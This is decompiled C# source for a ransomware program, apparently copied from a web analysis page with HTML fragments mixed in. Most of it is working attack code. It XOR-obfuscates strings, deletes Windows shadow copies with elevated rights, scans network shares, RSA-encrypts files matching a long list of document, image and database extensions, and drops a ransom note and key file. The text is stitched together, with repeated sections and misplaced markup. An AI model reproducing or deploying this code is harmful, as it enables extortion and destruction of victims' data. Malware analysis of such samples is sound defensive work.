0xcb, 230, 230, 0xeb, 0xfd, 0xe2, 0xc0, 0xa2, 0xc9, 0xba, 0xe0, 0xcb, 0xa6, 0xc4, 0xe8, 0xe9, 0xa3, 0xa8, 0xa1, 0xde, 0xf9, 0xcb, 160, 0xc6, 0xe7, 0xdd, 0xe5, 0xa7, 0xf2, 0xfc, 0xd5,0xf5, 0xa4, 0xfe, 0xc3, 0xe2, 0xdd, 0xfe, 0xd9, 0xdd, 0xff, 0xfe, 0xd6, 230, 0xe2, 160, 210,0xc6, 0xd7, 220, 0xde, 0xd6, 0xd7, 0xfb, 0xe5, 0xf3, 240, 0xc3, 0xde, 0xc2, 250, 0xc5, 0xf6, 0xa2, 0xc6, 0xba, 0xa6, 0xa3, 190, 0xc5, 0xfb, 0xeb, 0xd9, 250, 0xe4, 0xc1, 0xe1, 0xa3, 0xc6,190, 0xc3, 210, 0xa6, 0xd7, 0xd3, 210, 0xa5, 0xdb, 0xe1, 0xf6, 0xf6, 0xe4, 210, 0xf8, 0xa5, 0xe9, 0xa5, 0xe8, 0xf4, 0xa5, 0xd9, 0xd4, 230, 0xc3, 250, 0xc0, 0xa6, 0xa4, 0xe5, 0xd9, 0xf9, 0xf8, 0xf6, 0xa1, 0xa9, 0xf9, 0xc3, 0xda, 0xfc, 160, 240, 0xa6, 230, 0xfd, 230, 200, 0xfd, 0xa9, 0xeb, 0xdd, 0xd0, 0xeb, 220, 0xa9, 0xd0, 230, 0xc5, 0xc1, 0xdd, 0xf9, 0xa6, 0xa6, 0xa1, 220, 0xde, 0xeb, 0xc1, 0xe0, 0xd7, 160, 0xf7, 0xdb, 220, 0xda, 0xcb, 210, 0xd0, 0xe5, 0xf5, 0xc4, 0xf6, 0xd8, 0xda, 0xf5, 200, 0xdf, 0xd0, 250, 0xe3, 0xc1, 160, 0xa9, 0xe2, 0xc3, 0xf3, 0xe2, 0xf9, 250, 0xd6, 0xdf, 0xfb, 230, 0xfb, 220, 0xf9, 220, 0xdd, 0xdf, 0xf3, 0xda, 0xc5, 240, 200, 0xf7, 0xfe, 0xa2, 0xe0, 0xd8, 0xc2, 0xa5, 0xe7, 0xe5, 0xc7, 0xc4, 0xc0, 0xe5, 0xf2, 230, 0xba, 0xf6, 0xa8, 0xe8, 0xe2, 0xa2, 0xcb, 0xd7, 0xcb, 0xf4, 0xe5, 0xda, 0xd4, 0xfd, 0xa1, 0xcb, 220, 0xdb, 0xd4, 0xe1, 0xa5, 0xc9, 0xa6, 0xf3, 0xa5, 0xd9, 0xda, 0xa8, 0xe7, 0xe0, 0xc4, 0xfe, 0xf9, 0xc1, 0xd3, 200, 0xf7, 0xd3, 0xe2, 0xeb, 0xc9, 200, 0xa7, 0xf8, 0xfe, 0xff, 0xa4, 0xfc, 0xa4, 0xe5, 0xc2, 0xc2, 0xf7, 0xf9, 0xdb, 0xda, 0xa7, 0xde, 0xc9, 0xa3, 0xd9, 0xc1, 240, 0xc4, 0xa7, 0xc3, 0xd5, 0xf2, 240, 0xfb, 0xc5, 0xf4, 0xd4, 0xf2, 0xfc, 250, 0xa8, 0xf8, 0xe5, 0xa8, 0xe9, 0xa6, 0xa2, 0xf5, 0xe3, 0xdb, 0xfd, 0xf4, 0xcb, 160, 0xd6, 0xba, 0xe5, 0xc7, 0xf6, 0xdd, 0xa7, 0xf5, 0xe4, 0xdd, 0xc9, 190, 0xe4, 0xde, 0xc6, 0xc1, 0xc7, 0xe8, 0xf8, 0xa1, 0xe3, 0xf9, 0xe8, 0xe7, 200, 0xfc, 0xc3, 0xe3, 0xd6, 0xdf, 0xf2, 0xd8, 0xc0, 0xac, 0xac, 0xad, 190, 220, 0xfe, 0xf5, 0xe4, 0xfd, 0xe4, 0xe2, 0xaf, 0xad, 0xd4, 0xe9, 0xe1, 0xfe, 0xff, 0xf4, 0xff, 0xe5, 0xaf, 0xd0, 0xc0, 0xd0, 0xd3, 0xad, 190, 0xd4, 0xe9, 0xe1, 0xfe, 0xff, 0xf4, 0xff, 0xe5, 0xaf, 0xad, 190, 0xc3, 0xc2, 0xd0, 0xda, 0xf4, 0xe8, 0xc7, 240, 0xfd, 0xe4, 0xf4, 0xaf}; //  Windows Vista   -    . if (Environment.OSVersion.Version.Major &gt; 5) { new Thread(new ThreadStart(this.DelS)).Start(); } //       ... this.pbK = this.DeXOR(buffer3, this.X); string str = this.DeXOR(buffer2, this.X); this.vNF = this.DeXOR(buffer2, this.X); this.keyfile = this.DeXOR(a, this.X); this.kfExt = this.RetFExt(this.keyfile); this.kfName = this.RetFName(this.keyfile); this.keyCode = "."; //      Random random = new Random(); random.Next(0x61, 0x7a); for (int i = 0; i &lt; 1; i++) { this.keyCode = this.keyCode + Convert.ToChar(random.Next(0x61, 0x7a)).ToString(); } string[] textArray1 = new string[] { this.keyCode, (DateTime.Now.Day + 10).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString(), (DateTime.Now.Month + 10).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString() }; this.keyCode = string.Concat(textArray1); //      ... //       ... string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.System); folderPath = folderPath.Substring(0, folderPath.ToLower().IndexOf(@"\system")); string str3 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles); this.SpecFolders.Add(folderPath.ToLower()); this.SpecFolders.Add(str3.ToLower()); this.SpecFolders.Add(this.DeXOR(new byte[] { 0xc3, 0xd4, 210, 200, 210, 0xdd, 0xd4, 0xc3 }, this.X)); this.SpecFolders.Add(this.DeXOR(new byte[] { 0xb5, 0xc3, 0xd4, 210, 200, 210, 0xdd, 0xd4, 0xbf, 0xd3, 0xd8, 0xdf }, this.X)); this.SpecFolders.Add(this.DeXOR(new byte[] { 0xc2, 0xe8, 0xe2, 0xe5, 0xf4, 0xfc, 0xb1, 0xc7, 0xfe, 0xfd, 0xe4, 0xfc, 0xf4, 0xb1, 0xd8, 0xff, 0xf7, 0xfe, 0xe3, 0xfc, 240, 0xe5, 0xf8, 0xfe, 0xff }, this.X)); /*  ... c:\windows c:\program files (x86) RECYCLER $RECYCLE.BIN System Volume Information */ ///    this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf2, 0xf5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfd, 0xf5, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfc, 0xf5, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfc, 240, 0xe9 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf5, 0xf3, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf4, 0xe1, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 160, 0xf2, 0xf5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfc, 0xf5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf5, 0xf3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xf5, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xe1, 0xe5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe9, 0xfd, 0xe2 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf5, 0xfe, 0xf2 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 240, 0xe3, 0xfb }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe5, 240, 0xe3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xa6, 0xeb }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe3, 240, 0xe3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xeb, 0xf8, 0xe1 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe5, 0xf8, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfb, 0xe1, 0xf6 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 240, 0xf8 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf3, 0xfc, 0xe1 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xff, 0xf6 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf2, 0xf5, 0xe3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xe2, 0xf5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfb, 0xe1, 0xf4, 0xf6 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf5, 0xfe, 0xf2, 0xe9 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe9, 0xfd, 0xe2, 0xe9 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xe1, 0xe5, 0xe9 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 240, 0xf2, 0xf2, 0xf5, 0xf3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfc, 0xf5, 0xf3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe3, 0xe5, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xf5, 0xe5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xf5, 0xe2 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xf5, 0xf3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xf5, 0xf6 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf2, 0xe3, 0xa3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xff, 0xf4, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xff, 0xe3, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xe3, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 240, 0xe3, 230 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe2, 0xe3, 0xa3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe2, 0xe3, 0xf7 }, this.X)); /* *   : .cd.ldf .mdf .max .dbf .epf .1cd .md .db .pdf .ppt .xls .doc .arj .tar .7z .rar .zip .tif .jpg .ai .bmp .png .cdr .psd .jpeg .docx .xlsx .pptx .accdb .mdb .rtf .odt .ods .odb .odg .cr2 .nef .nrf .orf .arw .sr2 .srf */ //    List&lt;string&gt; list = new List&lt;string&gt;(); Process process = new Process { StartInfo = { FileName = "cmd", Arguments = "/C net view", RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true } }; try { bool flag4; process.Start(); string str4 = process.StandardOutput.ReadToEnd(); int startIndex = 0; int index = 0; goto Label_0A8B; Label_0A48: startIndex = str4.IndexOf('\\', startIndex); if (startIndex == -1) { goto Label_0A98; } index = str4.IndexOf(' ', startIndex); list.Add(str4.Substring(startIndex, index - startIndex)); startIndex = index; Label_0A8B: flag4 = true; goto Label_0A48; } catch { } Label_0A98: num5 = 0; while (num5 &lt; list.Count) { Process process2 = new Process { StartInfo = { FileName = "cmd", Arguments = "/C net view " + list[num5], RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true } }; try { process2.Start(); string s = process2.StandardOutput.ReadToEnd(); byte[] bytes = Encoding.GetEncoding(0x4e3).GetBytes(s); char[] separator = new char[] { '\r', '\n' }; string[] strArray = Encoding.GetEncoding("CP866").GetString(bytes).Split(separator); for (int j = 0; j &lt; strArray.Length; j++) { if (strArray[j].IndexOf("") &gt; -1) { this.FullList.Add(list[num5] + @"\" + strArray[j].Substring(0, strArray[j].IndexOf(""))); } } } catch { } num5++; } ///    ...RSA 2048 RSACryptoServiceProvider provider = new RSACryptoServiceProvider(0x800); this.publicKey = provider.ToXmlString(false); //     XML this.privateKey = this.CryptKey(provider.ToXmlString(true)); //      ... } /////        ssda.far private void SaveKey(string f, string k) { string str = this.keyfile.Substring(0, this.keyfile.Length - 4); if (!File.Exists(f + @"\" + this.keyfile)) { try { File.WriteAllText(f + @"\" + this.keyfile, k); } catch { } } else { try { File.WriteAllText(string.Concat(new object[] { f, @"\", str, this.AmountFiles(f), ".", this.kfExt }), k); } catch { } } } /////              private void SaveNotes() { List&lt;string&gt; list = new List&lt;string&gt; { //     Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory), //   Environment.GetFolderPath(Environment.SpecialFolder.Personal) //   }; for (int i = 0; i &lt; list.Count; i++) //    { this.SaveKey(list[i], this.privateKey); //     ssda.far this.AddNote(list[i]); //      } } /////   private void GetDirs(DirectoryInfo pth) { try { DirectoryInfo[] directories = pth.GetDirectories(); foreach (DirectoryInfo info in directories) { this.GetFiles(info); this.GetDirs(info); } } catch { } } /////       private void GetDrives() { try { string[] logicalDrives = Environment.GetLogicalDrives(); for (int i = 0; i &lt; logicalDrives.Length; i++) { DriveInfo info = new DriveInfo(logicalDrives[i]); if ((info.DriveType == DriveType.Fixed) || (info.DriveType == DriveType.Network)) { this.GetDirs(info.RootDirectory); } } } catch { } } ////      ... private void GetFiles(DirectoryInfo folder) { try { string[] files = Directory.GetFiles(folder.FullName, "*.*"); foreach (string str in files) { foreach (string str2 in this.extensions) //    { if ((str.ToLower().IndexOf(str2) &gt; -1) &amp;&amp; (str.ToLower().IndexOf(str2 + ".") == -1)) { string str3 = str; if (str.IndexOf(this.vNF) == -1) { this.CF(str3); ///  ... } } } } } catch { } } } }</span></span></code> , 0xf2, 0xfc, <code class="cs hljs"><span class="hljs-keyword"><span class="hljs-keyword">namespace</span></span> <span class="hljs-title"><span class="hljs-title">nekema</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">class</span></span> <span class="hljs-title"><span class="hljs-title">Form1</span></span> : <span class="hljs-title"><span class="hljs-title">Form</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">private</span></span> <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> blocksize = <span class="hljs-number"><span class="hljs-number">0xf5</span></span>; <span class="hljs-comment"><span class="hljs-comment">//245  . private IContainer components = null; private List&lt;string&gt; extensions = new List&lt;string&gt;(); //   private List&lt;string&gt; FullList = new List&lt;string&gt;(); //    private string keyCode; //   .  . private string keyfile = ""; //    "ssda.far" private string kfExt = ""; //   "far" private string kfName = ""; //   "ssda" private static readonly int MAX_PATH = 260; //   private string pbK = ""; //        . private string privateKey = ""; //        private string publicKey = ""; //     . private int repeatCount = 3; //    private List&lt;string&gt; SpecFolders = new List&lt;string&gt;(); private string vNF = ""; //   HOW--TO--RETURN--YOUR--FILES.jpg private byte X = 0x91; // //      DEXOR = 145 //////        HOW--TO--RETURN--YOUR--FILES.jpg private void AddNote(string f) { string currentDirectory = Environment.CurrentDirectory; if (f != currentDirectory) { try { if (!File.Exists(f + @"\" + this.vNF)) { Resources.ne5.Save(f + @"\" + this.vNF); } } catch { } } } ////////   -   private void CF(string f1) { byte[] destinationArray = new byte[this.blocksize]; try { byte[] sourceArray = File.ReadAllBytes(f1); if ((sourceArray.Length / (this.repeatCount + 5)) &gt;= this.blocksize) { RSACryptoServiceProvider provider = new RSACryptoServiceProvider(0x800); provider.FromXmlString(this.publicKey); byte[] buffer3 = new byte[sourceArray.Length + (this.repeatCount * 11)]; byte[] buffer4 = new byte[sourceArray.Length - (this.repeatCount * this.blocksize)]; for (int i = 0; i &lt; this.repeatCount; i++) { Array.Copy(sourceArray, this.blocksize * i, destinationArray, 0, this.blocksize); byte[] buffer5 = provider.Encrypt(destinationArray, false); Array.Copy(buffer5, 0, buffer3, i * (this.blocksize + 11), buffer5.Length); } Array.Copy(sourceArray, this.repeatCount * this.blocksize, buffer4, 0, buffer4.Length); Array.Copy(buffer4, 0, buffer3, this.repeatCount * (this.blocksize + 11), buffer4.Length); try { File.WriteAllBytes(f1, buffer3); File.Move(f1, f1 + this.keyCode); } catch { } } } catch { } } //////          -   private string CryptKey(string s) { string str = ""; byte[] array = new byte[s.Length]; byte[] destinationArray = new byte[this.blocksize]; byte[] bytes = new byte[this.blocksize + 11]; double num = Math.Ceiling((double) (((double) s.Length) / ((double) this.blocksize))); if (s.Length &lt; (num * this.blocksize)) { int length = s.Length; for (int i = 0; i &lt; ((num * this.blocksize) - length); i++) { s = s + " "; } } array = Encoding.Default.GetBytes(s); Array.Reverse(array); try { RSACryptoServiceProvider provider = new RSACryptoServiceProvider(0x800); provider.FromXmlString(this.pbK); for (int j = 0; j &lt; num; j++) { Array.Copy(array, j * this.blocksize, destinationArray, 0, this.blocksize); bytes = provider.Encrypt(destinationArray, false); str = str + Encoding.Default.GetString(bytes); } } catch { } return str; } /////     private void DelS() { byte[] a = new byte[] { 0xe7, 0xe2, 0xe2, 240, 0xf5, 0xfc, 0xf8, 0xff, 0xbf, 0xf4, 0xe9, 0xf4 }; byte[] buffer2 = new byte[] { 0xd5, 0xf4, 0xfd, 0xf4, 0xe5, 0xf4, 0xb1, 0xc2, 0xf9, 240, 0xf5, 0xfe, 230, 0xe2, 0xb1, 190, 0xd0, 0xfd, 0xfd, 0xb1, 190, 0xc0, 0xe4, 0xf8, 0xf4, 0xe5 }; Process process = new Process { StartInfo = { FileName = this.DeXOR(a, this.X), Arguments = this.DeXOR(buffer2, this.X), WindowStyle = ProcessWindowStyle.Hidden, CreateNoWindow = true, UseShellExecute = true, Verb = "runas" } }; try { process.Start(); } catch { } } /////          XOR private string DeXOR(byte[] A, int x) { string str = ""; byte[] bytes = new byte[A.Length]; for (int i = 0; i &lt; A.Length; i++) { bytes[i] = (byte) (A[i] ^ x); } return (str = Encoding.Default.GetString(bytes)); } /////    . private void Init() { this.Prep(); //  this.SaveNotes(); //      this.GetDrives(); //   this.NetScan(); //   this.SetDesktopWallpaper(); //        ,    } private void Prep() { int num5; //  a = ssda.far byte[] a = new byte[] { 0xe2, 0xe2, 0xf5, 240, 0xbf, 0xf7, 240, 0xe3 }; //buffer2 = HOW--TO--RETURN--YOUR--FILES.jpg byte[] buffer2 = new byte[] {0xd9, 0xde, 0xc6, 0xbc, 0xbc, 0xc5, 0xde, 0xbc, 0xbc, 0xc3, 0xd4, 0xc5, 0xc4, 0xc3, 0xdf, 0xbc, 0xbc, 200, 0xde, 0xc4, 0xc3, 0xbc, 0xbc, 0xd7, 0xd8, 0xdd, 0xd4, 0xc2, 0xbf, 0xfb, 0xe1, 0xf6}; //buffer3 = &lt;RSAKeyValue &lt;Modulus&gt;+fFYiO9CH9iZwwzlsQ3X+qZ7Uyx290OhZ1WvLt6cmDd5oRsLoHLnoGws1CWFMOGFjtbaROSkTg3W+72/TjzHkuPp2W/RC7FBC4JpgguCi4x4ye4HEwRkQ75tHhig08hRKm1a7wlwYl8zLAzM8AwTPLh770MOzPqF1fJMKZCAtdUgIKdYNAkrP18sRbshkGNjwjMhMLNbKTaYfo3qIS4vtVUQtcw+g9ys3ZFZetKEl0ZMJEp4X7b4HK9vqUohPBYfBszXY6ion5m5tSSfhJK6OX2HPaU6RDcajTeEcmk9it9x73drJleZ1G+tVgL6duLX/uOWPVyi0rhyvYmRrGNcIQ==&lt;/Modulus&gt;&lt;Exponent&gt;AQAB&lt;/Exponent&gt;&lt;/RSAKeyValue&gt; byte[] buffer3 = new byte[] { 0xad, 0xc3, 0xc2, 0xd0, 0xda, 0xf4, 0xe8, 0xc7, 240, 0xfd, 0xe4, 0xf4, 0xaf, 0xad, 220, 0xfe, 0xf5, 0xe4, 0xfd, 0xe4, 0xe2, 0xaf, 0xba, 0xf7, 0xd7, 200, 0xf8, 0xde, 0xa8, 210, 0xd9, 0xa8, 0xf8, 0xcb, 230, 230, 0xeb, 0xfd, 0xe2, 0xc0, 0xa2, 0xc9, 0xba, 0xe0, 0xcb, 0xa6, 0xc4, 0xe8, 0xe9, 0xa3, 0xa8, 0xa1, 0xde, 0xf9, 0xcb, 160, 0xc6, 0xe7, 0xdd, 0xe5, 0xa7, 0xf2, 0xfc, 0xd5,0xf5, 0xa4, 0xfe, 0xc3, 0xe2, 0xdd, 0xfe, 0xd9, 0xdd, 0xff, 0xfe, 0xd6, 230, 0xe2, 160, 210,0xc6, 0xd7, 220, 0xde, 0xd6, 0xd7, 0xfb, 0xe5, 0xf3, 240, 0xc3, 0xde, 0xc2, 250, 0xc5, 0xf6, 0xa2, 0xc6, 0xba, 0xa6, 0xa3, 190, 0xc5, 0xfb, 0xeb, 0xd9, 250, 0xe4, 0xc1, 0xe1, 0xa3, 0xc6,190, 0xc3, 210, 0xa6, 0xd7, 0xd3, 210, 0xa5, 0xdb, 0xe1, 0xf6, 0xf6, 0xe4, 210, 0xf8, 0xa5, 0xe9, 0xa5, 0xe8, 0xf4, 0xa5, 0xd9, 0xd4, 230, 0xc3, 250, 0xc0, 0xa6, 0xa4, 0xe5, 0xd9, 0xf9, 0xf8, 0xf6, 0xa1, 0xa9, 0xf9, 0xc3, 0xda, 0xfc, 160, 240, 0xa6, 230, 0xfd, 230, 200, 0xfd, 0xa9, 0xeb, 0xdd, 0xd0, 0xeb, 220, 0xa9, 0xd0, 230, 0xc5, 0xc1, 0xdd, 0xf9, 0xa6, 0xa6, 0xa1, 220, 0xde, 0xeb, 0xc1, 0xe0, 0xd7, 160, 0xf7, 0xdb, 220, 0xda, 0xcb, 210, 0xd0, 0xe5, 0xf5, 0xc4, 0xf6, 0xd8, 0xda, 0xf5, 200, 0xdf, 0xd0, 250, 0xe3, 0xc1, 160, 0xa9, 0xe2, 0xc3, 0xf3, 0xe2, 0xf9, 250, 0xd6, 0xdf, 0xfb, 230, 0xfb, 220, 0xf9, 220, 0xdd, 0xdf, 0xf3, 0xda, 0xc5, 240, 200, 0xf7, 0xfe, 0xa2, 0xe0, 0xd8, 0xc2, 0xa5, 0xe7, 0xe5, 0xc7, 0xc4, 0xc0, 0xe5, 0xf2, 230, 0xba, 0xf6, 0xa8, 0xe8, 0xe2, 0xa2, 0xcb, 0xd7, 0xcb, 0xf4, 0xe5, 0xda, 0xd4, 0xfd, 0xa1, 0xcb, 220, 0xdb, 0xd4, 0xe1, 0xa5, 0xc9, 0xa6, 0xf3, 0xa5, 0xd9, 0xda, 0xa8, 0xe7, 0xe0, 0xc4, 0xfe, 0xf9, 0xc1, 0xd3, 200, 0xf7, 0xd3, 0xe2, 0xeb, 0xc9, 200, 0xa7, 0xf8, 0xfe, 0xff, 0xa4, 0xfc, 0xa4, 0xe5, 0xc2, 0xc2, 0xf7, 0xf9, 0xdb, 0xda, 0xa7, 0xde, 0xc9, 0xa3, 0xd9, 0xc1, 240, 0xc4, 0xa7, 0xc3, 0xd5, 0xf2, 240, 0xfb, 0xc5, 0xf4, 0xd4, 0xf2, 0xfc, 250, 0xa8, 0xf8, 0xe5, 0xa8, 0xe9, 0xa6, 0xa2, 0xf5, 0xe3, 0xdb, 0xfd, 0xf4, 0xcb, 160, 0xd6, 0xba, 0xe5, 0xc7, 0xf6, 0xdd, 0xa7, 0xf5, 0xe4, 0xdd, 0xc9, 190, 0xe4, 0xde, 0xc6, 0xc1, 0xc7, 0xe8, 0xf8, 0xa1, 0xe3, 0xf9, 0xe8, 0xe7, 200, 0xfc, 0xc3, 0xe3, 0xd6, 0xdf, 0xf2, 0xd8, 0xc0, 0xac, 0xac, 0xad, 190, 220, 0xfe, 0xf5, 0xe4, 0xfd, 0xe4, 0xe2, 0xaf, 0xad, 0xd4, 0xe9, 0xe1, 0xfe, 0xff, 0xf4, 0xff, 0xe5, 0xaf, 0xd0, 0xc0, 0xd0, 0xd3, 0xad, 190, 0xd4, 0xe9, 0xe1, 0xfe, 0xff, 0xf4, 0xff, 0xe5, 0xaf, 0xad, 190, 0xc3, 0xc2, 0xd0, 0xda, 0xf4, 0xe8, 0xc7, 240, 0xfd, 0xe4, 0xf4, 0xaf}; //  Windows Vista   -    . if (Environment.OSVersion.Version.Major &gt; 5) { new Thread(new ThreadStart(this.DelS)).Start(); } //       ... this.pbK = this.DeXOR(buffer3, this.X); string str = this.DeXOR(buffer2, this.X); this.vNF = this.DeXOR(buffer2, this.X); this.keyfile = this.DeXOR(a, this.X); this.kfExt = this.RetFExt(this.keyfile); this.kfName = this.RetFName(this.keyfile); this.keyCode = "."; //      Random random = new Random(); random.Next(0x61, 0x7a); for (int i = 0; i &lt; 1; i++) { this.keyCode = this.keyCode + Convert.ToChar(random.Next(0x61, 0x7a)).ToString(); } string[] textArray1 = new string[] { this.keyCode, (DateTime.Now.Day + 10).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString(), (DateTime.Now.Month + 10).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString() }; this.keyCode = string.Concat(textArray1); //      ... //       ... string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.System); folderPath = folderPath.Substring(0, folderPath.ToLower().IndexOf(@"\system")); string str3 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles); this.SpecFolders.Add(folderPath.ToLower()); this.SpecFolders.Add(str3.ToLower()); this.SpecFolders.Add(this.DeXOR(new byte[] { 0xc3, 0xd4, 210, 200, 210, 0xdd, 0xd4, 0xc3 }, this.X)); this.SpecFolders.Add(this.DeXOR(new byte[] { 0xb5, 0xc3, 0xd4, 210, 200, 210, 0xdd, 0xd4, 0xbf, 0xd3, 0xd8, 0xdf }, this.X)); this.SpecFolders.Add(this.DeXOR(new byte[] { 0xc2, 0xe8, 0xe2, 0xe5, 0xf4, 0xfc, 0xb1, 0xc7, 0xfe, 0xfd, 0xe4, 0xfc, 0xf4, 0xb1, 0xd8, 0xff, 0xf7, 0xfe, 0xe3, 0xfc, 240, 0xe5, 0xf8, 0xfe, 0xff }, this.X)); /*  ... c:\windows c:\program files (x86) RECYCLER $RECYCLE.BIN System Volume Information */ ///    this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf2, 0xf5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfd, 0xf5, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfc, 0xf5, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfc, 240, 0xe9 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf5, 0xf3, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf4, 0xe1, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 160, 0xf2, 0xf5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfc, 0xf5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf5, 0xf3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xf5, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xe1, 0xe5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe9, 0xfd, 0xe2 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf5, 0xfe, 0xf2 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 240, 0xe3, 0xfb }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe5, 240, 0xe3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xa6, 0xeb }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe3, 240, 0xe3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xeb, 0xf8, 0xe1 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe5, 0xf8, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfb, 0xe1, 0xf6 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 240, 0xf8 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf3, 0xfc, 0xe1 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xff, 0xf6 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf2, 0xf5, 0xe3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xe2, 0xf5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfb, 0xe1, 0xf4, 0xf6 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf5, 0xfe, 0xf2, 0xe9 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe9, 0xfd, 0xe2, 0xe9 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xe1, 0xe5, 0xe9 }, this.X)); 